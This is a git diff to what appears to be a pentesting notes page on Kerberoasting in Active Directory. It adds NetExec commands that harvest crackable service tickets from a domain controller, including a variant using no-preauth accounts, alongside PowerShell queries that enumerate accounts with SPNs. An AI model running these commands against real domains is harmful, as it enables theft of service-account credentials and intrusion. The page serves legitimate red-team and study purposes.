@@ -1,4 +1,7 @@
 ---
+description: >-
+  The goal of Kerberoasting is to harvest TGS tickets for services that run on
+  behalf of user accounts in the AD, not computer accounts.
 metaLinks:
   alternates:
     - >-
@@ -8,6 +11,12 @@ metaLinks:
 # Kerberoasting
 
 ## Discovery Kerberos Account
+
+{% code overflow="wrap" %}
+```bash
+nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
+```
+{% endcode %}
 
 ```powershell
 # ADSearch
@@ -22,6 +31,14 @@ Get-DomainUser -SPN | select serviceprincipalname
 # AD-Module
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
+
+## Kerberoasting via AS-REP Roasting
+
+{% code overflow="wrap" %}
+```bash
+nxc ldap 192.168.0.104 -u harry -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
+```
+{% endcode %}
 
 ## Impacket
 
